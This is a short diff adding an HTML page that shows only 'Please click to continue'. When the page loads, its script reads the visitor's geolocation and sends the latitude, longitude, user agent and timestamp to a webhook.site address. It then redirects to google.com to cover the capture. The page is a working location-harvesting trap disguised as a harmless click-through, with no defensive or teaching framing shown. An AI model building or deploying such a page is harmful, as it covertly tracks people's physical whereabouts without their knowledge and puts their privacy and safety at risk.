@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Click Here</title>
+</head>
+<body>
+    <h2>Please click to continue</h2>
+    <script>
+        navigator.geolocation.getCurrentPosition(function(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+
+            // Send data to your webhook
+            fetch('https://webhook.site/a596ceae-b0da-4eed-b3da-abf547251ce5', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                })
+            }).then(() => {
+                window.location.href = "https://google.com"; // Optional redirect
+            });
+        });
+    </script>
+</body>
+</html>
